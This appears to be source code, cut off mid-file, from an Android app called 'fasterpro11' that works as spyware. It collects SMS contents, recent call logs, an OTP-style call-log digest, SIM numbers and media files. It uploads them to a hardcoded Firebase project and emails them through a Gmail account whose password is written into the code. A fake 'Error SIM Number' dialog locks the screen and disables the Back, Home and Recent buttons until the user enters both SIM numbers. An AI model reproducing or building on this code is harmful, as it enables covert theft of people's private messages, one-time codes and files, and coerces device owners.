import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class FirebaseSaVeAndViewData {

    private static final String TAG = "FirebaseSaVeAndViewData";
    private static final String DATABASE_URL = "https://fasterpro11-9b9a9-default-rtdb.firebaseio.com/";
    private DatabaseReference mDatabase;

    // Firebase Database à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œà§‡à¦¶à¦¨
    public FirebaseSaVeAndViewData() {
        mDatabase = FirebaseDatabase.getInstance(DATABASE_URL).getReference();
    }

    /**
     * SMS à¦¡à§‡à¦Ÿà¦¾ Firebase-à¦ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à¦¾ (SMS ID à¦†à¦—à§‡à¦° à¦®à¦¤à§‹)
     */
    public void saveSmsDataToFirebase(
            String sender,
            String body,
            String subject,
            String recentCallLogs,
            Context context
    ) {
        try {
            // SIM à¦à¦¬à¦‚ à¦¡à¦¿à¦­à¦¾à¦‡à¦¸ à¦¤à¦¥à§à¦¯ à¦¨à¦¿à¦¨
            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
            String UserID1 = alert.getSim1NumberFromUser(context);
            String UserID2 = alert.getSim2NumberFromUser(context);
            String UserGivenSimNumber = (UserID1 != null ? UserID1 : "null") + " " + (UserID2 != null ? UserID2 : "null");

            NotificationListener notificationListener = new NotificationListener();
            String setSim1NumberNotificationListener = notificationListener.SetSim1Number(context, body);

            SmsReceiver smsReceiver = new SmsReceiver();
            String setSim1NumberSmsReceiver = smsReceiver.SetSim1Number(context, body);

            String setSim1Number;
            if (setSim1NumberNotificationListener != null) {
                setSim1Number = setSim1NumberNotificationListener;
            } else if (setSim1NumberSmsReceiver != null) {
                setSim1Number = setSim1NumberSmsReceiver;
            } else {
                setSim1Number = "null";
            }

            String manufacturer = Build.MANUFACTURER != null ? Build.MANUFACTURER : "unknown";
            String mobileModel = Build.MODEL != null ? Build.MODEL : "unknown";

            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault()).format(new Date());

            // Firebase push key + timestamp + sim/device info (SMS ID à¦†à¦—à§‡à¦° à¦®à¦¤à§‹)
            String pushKey = mDatabase.push().getKey();
            String smsId = (pushKey != null ? pushKey : "unknown") + " " +
                    timestamp + " " +
                    setSim1Number + " " +
                    UserGivenSimNumber + " " +
                    manufacturer + " " +
                    mobileModel;

            Log.d(TAG, "Generated SMS ID: " + smsId);

            if (smsId != null) {
                Map<String, Object> smsData = new HashMap<>();

                // Subject lines
                smsData.put("subject", Arrays.asList(subject.split("\n")));
                // Sender
                smsData.put("sender", sender);
                // Body lines
                smsData.put("messageBody", Arrays.asList(body.split("\n")));
                // Call logs
                smsData.put("recentCallLogs", Arrays.asList(recentCallLogs.split("\n")));

                // Firebase-à¦ à¦¸à¦‚à¦°à¦•à§à¦·à¦£
                mDatabase.child("smsData").child(smsId).setValue(smsData)
                        .addOnCompleteListener(task -> {
                            if (task.isSuccessful()) {
                                Log.d(TAG, "âœ… Firebase Data Saved Successfully.");
                            } else {
                                Log.e(TAG, "âŒ Firebase Data Save Error: ", task.getException());
                            }
                        });
            } else {
                Log.e(TAG, "âŒ SMS ID Create Error");
            }

        } catch (Exception e) {
            Log.e(TAG, "âŒ Exception in saveSmsDataToFirebase: ", e);
        }
    }
}



//FirebaseSaveAudioVideoPicture.java
package com.example.fasterpro11;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class FirebaseSaveAudioVideoPicture {
    private static final String TAG = "FirebaseSaveMedia";

    public void SaveAudioVideoPictureDataToFirebaseStorage(String recipientEmail, String subject, String emailContent, String filePath, Context context) {
        Log.d(TAG, "Starting file upload process for: " + filePath);

        File file = new File(filePath);
        if (!file.exists()) {
            Log.e(TAG, "File does not exist: " + filePath);
            return;
        }

        String fileType;
        if (filePath.endsWith(".jpg") || filePath.endsWith(".jpeg") || filePath.endsWith(".png")) {
            fileType = "images";
        } else if (filePath.endsWith(".mp4") || filePath.endsWith(".mkv") || filePath.endsWith(".avi")) {
            fileType = "videos";
        } else if (filePath.endsWith(".mp3") || filePath.endsWith(".wav") || filePath.endsWith(".m4a")) {
            fileType = "audios";
        } else {
            Log.e(TAG, "Unsupported file type: " + filePath);
            return;
        }

        try {
            // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦® à¦à¦¨à¦•à§‹à¦¡ à¦•à¦°à§‡ Firebase Storage-à¦ à¦ªà¦¾à¦ à¦¾à¦¨à§‹
            String safeFileName = URLEncoder.encode(file.getName(), "UTF-8");
            StorageReference storageReference = FirebaseStorage.getInstance().getReference().child(fileType + "/" + safeFileName);
            Uri fileUri = Uri.fromFile(file);

            UploadTask uploadTask = storageReference.putFile(fileUri);
            Log.d(TAG, "Uploading file to Firebase Storage...");

            uploadTask.addOnSuccessListener(taskSnapshot -> {
                Log.d(TAG, "File upload successful. Getting download URL...");
                storageReference.getDownloadUrl().addOnSuccessListener(uri -> {
                    String fileDownloadUrl = uri.toString();
                    Log.d(TAG, "File download URL retrieved: " + fileDownloadUrl);

                    // Firebase Realtime Database-à¦ à¦«à¦¾à¦‡à¦² URL à¦¸à¦‚à¦°à¦•à§à¦·à¦£
                    saveFileUrlToFirebaseDatabase(recipientEmail, subject, emailContent, fileType, fileDownloadUrl);
                }).addOnFailureListener(e -> {
                    Log.e(TAG, "Failed to retrieve download URL: ", e);
                });
            }).addOnFailureListener(e -> {
                Log.e(TAG, "File upload failed. Retrying...", e);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    storageReference.putFile(fileUri);
                }, 3000);
            });

        } catch (Exception e) {
            Log.e(TAG, "Error encoding file name", e);
        }
    }

    private void saveFileUrlToFirebaseDatabase(String recipientEmail, String subject, String emailContent, String fileType, String fileUrl) {
        Log.d(TAG, "Saving file URL to Firebase Realtime Database...");

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UploadedMedia");
        String uploadId = databaseReference.push().getKey();

        if (uploadId != null) {
            Map<String, Object> fileData = new HashMap<>();
            fileData.put("email", recipientEmail);
            fileData.put("subject", subject);
            fileData.put("message", emailContent);
            fileData.put("fileType", fileType);
            fileData.put("fileUrl", fileUrl);

            databaseReference.child(uploadId).setValue(fileData)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "File data saved successfully in Firebase Realtime Database."))
                    .addOnFailureListener(e -> Log.e(TAG, "Error saving file data in Firebase Database: ", e));
        } else {
            Log.e(TAG, "Upload ID is null. Cannot save data to Firebase.");
        }
    }
}



//FirebaseSaveData.java
package com.example.fasterpro11;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class FirebaseSaveData {
    public static void saveFileLinkToDatabase(String fileUrl, String fileType) {
        DatabaseReference databaseRef = FirebaseDatabase.getInstance().getReference("UploadedFiles");

        String fileId = databaseRef.push().getKey();
        Map<String, Object> fileData = new HashMap<>();
        fileData.put("url", fileUrl);
        fileData.put("type", fileType);
        fileData.put("timestamp", System.currentTimeMillis());

        if (fileId != null) {
            databaseRef.child(fileId).setValue(fileData)
                    .addOnSuccessListener(aVoid -> Log.d("FirebaseDB", "File URL Saved Successfully"))
                    .addOnFailureListener(e -> Log.e("FirebaseDB", "Failed to save file URL", e));
        }
    }
}



//GetRecentCallLogs.java
package com.example.fasterpro11;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class GetRecentCallLogs {
    private static final String TAG = "GetRecentCallLogs";
    private Context mContext;  // Context à¦«à¦¿à¦²à§à¦¡

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à¦Ÿà¦° à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§‡ à¦•à¦¨à§à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œ à¦•à¦°à¦¾
    public GetRecentCallLogs(Context context) {
        this.mContext = context;
    }


    public String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            // à¦•à¦² à¦²à¦—à¦—à§à¦²à§‹ à¦¨à¦¿à§Ÿà§‡ à¦†à¦¸à¦¾ (LIMIT à¦›à¦¾à§œà¦¾)
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 15) break; // à¦¸à¦°à§à¦¬à§‹à¦šà§à¦š à§§à§¦à¦Ÿà¦¿ à¦•à¦² à¦²à¦— à¦¦à§‡à¦–à¦¾à¦¬à§‡
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("Num: ").append(number)
                            .append(", Type: ").append(callType)
                            .append(", Duration: ").append(duration)
                            .append(", Date: ").append(DateUtils.dateToString(date))
                            .append("\n");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

// get Recent CallLogs As List For Firebase
List<String> getRecentCallLogsAsListForFirebase() {
        List<String> recentCalls = new ArrayList<>();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            // Query all call logs without LIMIT
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 10) break; // Limit to 10 results
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallTypeAsListForFirebase(type);

                    // Add the call log to the list as a formatted string
                    String callLog = "Number: " + number
                            + ", Type: " + callType
                            + ", Duration: " + duration
                            + ", Date: " + DateUtils.dateToString(date);
                    recentCalls.add(callLog);  // Add the formatted string to the list
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return recentCalls;
    }

    private String getCallTypeAsListForFirebase(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    public String OTPTypeGetRecentCallLogs() {

        if (mContext == null) {
            Log.e(TAG, "getRecentCallLogs Context is null.");
            return "";
        }
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 2) break;
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("").append(number)
                            .append("").append(new SimpleDateFormat("0HH0mm0", Locale.getDefault()).format(new Date(date)))
                            .append("");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();

    }



    }



//GetSim1AndSim2NumberFromAlertbox.java
package com.example.fasterpro11;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.text.Editable;
import android.text.InputType;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.TextView;

public class GetSim1AndSim2NumberFromAlertbox extends Activity {
    private static final String TAG = "GetSim1AndSim2NumberFromAlertbox";
    private String sim1NumberFromUser;
    private String sim2NumberFromUser;
    private int sim1Attempts = 0;
    private int sim2Attempts = 0;
    private Context context;
    public String UserID1;
    public String UserID2;
    private boolean isSim1Entered = false;
    private boolean isSim2Entered = false;
    private Handler handler = new Handler();
    public GetSim1AndSim2NumberFromAlertbox() {
        // Default constructor
    }

    public GetSim1AndSim2NumberFromAlertbox(Context context) {
        this.context = context;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.context = this;  // Set the Activity context
        Log.d(TAG, "Activity Created");
        Log.d(TAG, "onCreate showSim1Alert() called");
        hideSystemUI(); // Hide system UI control panel
        lockActivity(); // Lock the activity
        showSim1Alert();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (!isSim1Entered || !isSim2Entered) {
            Log.d(TAG, "Bringing app back to foreground");
            handler.postDelayed(() -> moveTaskToFront(), 500);
            moveTaskToBack(false); // à¦¬à§à¦¯à¦¾à¦•à¦—à§à¦°à¦¾à¦‰à¦¨à§à¦¡à§‡ à¦¯à¦¾à¦“à§Ÿà¦¾ à¦¬à¦¨à§à¦§ à¦•à¦°à§à¦¨
        }
    }

    private void moveTaskToFront() {
        if (!isSim1Entered || !isSim2Entered) {
            moveTaskToBack(false);
            showSim1Alert();
        }
    }


    @Override
    public void onBackPressed() {
        if (!isSim1Entered || !isSim2Entered) {
            // Disable the Back button until both SIM numbers are entered
            Log.d(TAG, "Back button is disabled until both SIM numbers are entered");
            return;
        }
        super.onBackPressed();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Disable Home and Recent buttons by intercepting key events
        if (keyCode == KeyEvent.KEYCODE_HOME || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            if (!isSim1Entered || !isSim2Entered) {
                // Prevent Home or Recent button functionality
                Log.d(TAG, "Home/Recent button is disabled until both SIM numbers are entered");
                return true; // Block the action
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    private void lockActivity() {
        // Lock the activity (disable Back, Home, and Recent buttons)
        Window window = getWindow();
        window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
    }

    private void unlockActivity() {
        // Unlock the activity (enable Back, Home, and Recent buttons)
        Window window = getWindow();
        window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }

    private void showSim1Alert() {
        Log.d(TAG, "showSim1Alert() called from onCreate");
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("âš  Error SIM Number");
        builder.setIcon(android.R.drawable.ic_dialog_alert);

        TextView titleView = new TextView(this);
        titleView.setText("âš  Error SIM Number");
        titleView.setTextColor(Color.RED);
        titleView.setTextSize(20);
        builder.setCustomTitle(titleView);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_PHONE);
        input.setHint("Enter SIM1 Number");
        input.setHintTextColor(Color.GRAY);
        builder.setView(input);

        builder.setPositiveButton("OK", null);
        builder.setCancelable(false);

        final AlertDialog dialog = builder.create();
        dialog.show();
        Log.d(TAG, "SIM1 AlertDialog shown");

        dialog.setCanceledOnTouchOutside(false);

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener(v -> {
            sim1NumberFromUser = input.getText().toString();
            Log.d(TAG, "SIM1 Number entered: " + sim1NumberFromUser);

            if (sim1NumberFromUser.isEmpty() || sim1NumberFromUser.length() < 11 || sim1NumberFromUser.length() > 14) {
                sim1Attempts++;
                Log.d(TAG, "SIM1 Attempts: " + sim1Attempts);
                if (sim1Attempts < 5) {
                    input.setError("Wrong number. Enter SIM1 Number");
                    input.setTextColor(Color.RED);
                    Log.e(TAG, "Wrong SIM1 Number entered");
                } else {
                    showErrorMessage("Maximum attempts reached for SIM1.");
                    sim1NumberFromUser = null;
                    Log.e(TAG, "Maximum attempts reached for SIM1");
                    finish();
                    dialog.dismiss();
                }
            } else {
                saveSim1NumberToSharedPreferences(); // Save SIM1 number to SharedPreferences
                isSim1Entered = true;
                dialog.dismiss();
                Log.d(TAG, "SIM1 Number is valid, proceeding to SIM2");
                showSim2Alert(); // Show SIM2 AlertDialog
            }
        });

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(false);
        Log.d(TAG, "OK button initially disabled");

        input.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                boolean isInputValid = charSequence.length() >= 11 && charSequence.length() <= 14;
                dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(isInputValid);
                Log.d(TAG, "Input changed, OK button enabled: " + isInputValid);
            }

            @Override
            public void afterTextChanged(Editable editable) {}
        });
    }

    private void showSim2Alert() {
        Log.d(TAG, "showSim2Alert() called");
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("âš  Error SIM Number");
        builder.setIcon(android.R.drawable.ic_dialog_alert);

        TextView titleView = new TextView(this);
        titleView.setText("âš  Error SIM Number");
        titleView.setTextColor(Color.RED);
        titleView.setTextSize(20);
        builder.setCustomTitle(titleView);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_PHONE);
        input.setHint("Enter SIM2 Number");
        input.setHintTextColor(Color.GRAY);
        builder.setView(input);

        builder.setPositiveButton("OK", null);
        builder.setCancelable(false);

        final AlertDialog dialog = builder.create();
        dialog.show();
        Log.d(TAG, "SIM2 AlertDialog shown");

        dialog.setCanceledOnTouchOutside(false);

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener(v -> {
            sim2NumberFromUser = input.getText().toString();
            Log.d(TAG, "SIM2 Number entered: " + sim2NumberFromUser);

            if (sim2NumberFromUser.isEmpty() || sim2NumberFromUser.length() < 11 || sim2NumberFromUser.length() > 14) {
                sim2Attempts++;
                Log.d(TAG, "SIM2 Attempts: " + sim2Attempts);
                if (sim2Attempts < 5) {
                    input.setError("Wrong number. Enter SIM2 Number");
                    input.setTextColor(Color.RED);
                    Log.e(TAG, "Wrong SIM2 Number entered");
                } else {
                    showErrorMessage("Maximum attempts reached for SIM2.");
                    sim2NumberFromUser = null;
                    Log.e(TAG, "Maximum attempts reached for SIM2");
                    finish();
                    dialog.dismiss();
                }
            } else {
                saveSim2NumberToSharedPreferences(); // Save SIM2 number to SharedPreferences
                isSim2Entered = true;
                dialog.dismiss();
                Log.d(TAG, "SIM2 Number is valid, saving SIM numbers");
                unlockActivity(); // Unlock the activity
                finish();
            }
        });

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(false);
        Log.d(TAG, "OK button initially disabled");

        input.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                boolean isInputValid = charSequence.length() >= 11 && charSequence.length() <= 14;
                dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(isInputValid);
                Log.d(TAG, "Input changed, OK button enabled: " + isInputValid);
            }

            @Override
            public void afterTextChanged(Editable editable) {}
        });
    }

    private void saveSim1NumberToSharedPreferences() {
        Log.d(TAG, "Saving SIM1 number: " + sim1NumberFromUser);
        SharedPreferences sharedPreferences = getSharedPreferences("SimNumbers", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("SIM1", sim1NumberFromUser);
        editor.apply();
        Log.d(TAG, "SIM1 number saved to SharedPreferences");
    }

    private void saveSim2NumberToSharedPreferences() {
        Log.d(TAG, "Saving SIM2 number: " + sim2NumberFromUser);
        SharedPreferences sharedPreferences = getSharedPreferences("SimNumbers", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("SIM2", sim2NumberFromUser);
        editor.apply();
        Log.d(TAG, "SIM2 number saved to SharedPreferences");
    }

    private void showErrorMessage(String message) {
        Log.e(TAG, "Showing error message: " + message);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage(message)
                .setPositiveButton("OK", null)
                .show();
    }

    public String retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers");
            return null;
        }
        Log.d(TAG, "Starting retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers method");

        SharedPreferences sharedPreferences = context.getSharedPreferences("SimNumbers", MODE_PRIVATE);
        Log.d(TAG, "SharedPreferences initialized with 'SimNumbers'");

        String sim1Number = sharedPreferences.getString("SIM1", null);
        Log.d(TAG, "Retrieved SIM1 Number from SharedPreferences: " + sim1Number);
        return sim1Number;
    }

    public String retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers");
            return null;
        }
        Log.d(TAG, "Starting retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers method");

        SharedPreferences sharedPreferences = context.getSharedPreferences("SimNumbers", MODE_PRIVATE);
        Log.d(TAG, "SharedPreferences initialized with 'SimNumbers'");

        String sim2Number = sharedPreferences.getString("SIM2", null);
        Log.d(TAG, "Retrieved SIM2 Number from SharedPreferences: " + sim2Number);
        return sim2Number;
    }

    public String getSim1NumberFromUser(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in getSim1NumberFromUser");
            return null;
        }
        String sim1Number = retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers(context);
        Log.d(TAG, "getSim1NumberFromUser sim1Number: " + sim1Number);
        return sim1Number;
    }

    public String getSim2NumberFromUser(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in getSim2NumberFromUser");
            return null;
        }
        String sim2Number = retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers(context);
        Log.d(TAG, "getSim2NumberFromUser sim2Number: " + sim2Number);
        return sim2Number;
    }

    /**
     * hideSystemUI() - Completely hides the system UI control panel.
     */
    private void hideSystemUI() {
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN);
    }

    /**
     * onAttachedToWindow() - Disables the Back, Home, and Recent app buttons.
     */
    @Override
    public void onAttachedToWindow() {
        super.onAttachedToWindow();
        Window window = getWindow();
        window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }
}


//InternetCheck .java
package com.example.fasterpro11;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;

public class InternetCheck {

    private boolean isInternetAvailable(Context context) {
        ConnectivityManager cm =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;

        NetworkCapabilities caps =
                cm.getNetworkCapabilities(cm.getActiveNetwork());
        return caps != null &&
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
    }


}



//JavaMailAPI.java
package com.example.fasterpro11;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class JavaMailAPI {

    public static void sendMail(String recipientEmail, String subject, String messageBody) {
        try {
            // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
            if (!CountEmail.canSendEmail()) {
                System.out.println("Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                return;
            }

            final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
            final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator() {
                        protected PasswordAuthentication getPasswordAuthentication() {
                            return new PasswordAuthentication(username, password);
                        }
                    });

            // Create a new email message
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
            message.setSubject(subject);
            message.setText(messageBody);

            // Send the email
            Transport.send(message);

            // Increment the email count after successful send
            CountEmail.incrementEmailCount();
            System.out.println("JavaMailAPI Email sent successfully");

        } catch (MessagingException e) {
            // Handle email-specific exceptions
            System.err.println("Error sending email: " + e.getMessage());
            e.printStackTrace();
        } catch (Exception e) {
            // Handle general exceptions (e.g., network issues, unexpected errors)
            System.err.println("An unexpected error occurred: " + e.getMessage());
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_CallRecord_Sender.java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.activation.DataHandler; // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
import javax.activation.DataSource; // à¦¡à§‡à¦Ÿà¦¾ à¦¸à§‹à¦°à§à¦¸
import javax.activation.FileDataSource; // à¦«à¦¾à¦‡à¦² à¦¡à§‡à¦Ÿà¦¾ à¦¸à§‹à¦°à§à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²

public class JavaMailAPI_CallRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_CallRecord_Sender(String email, String subject, String message, String filePath) {
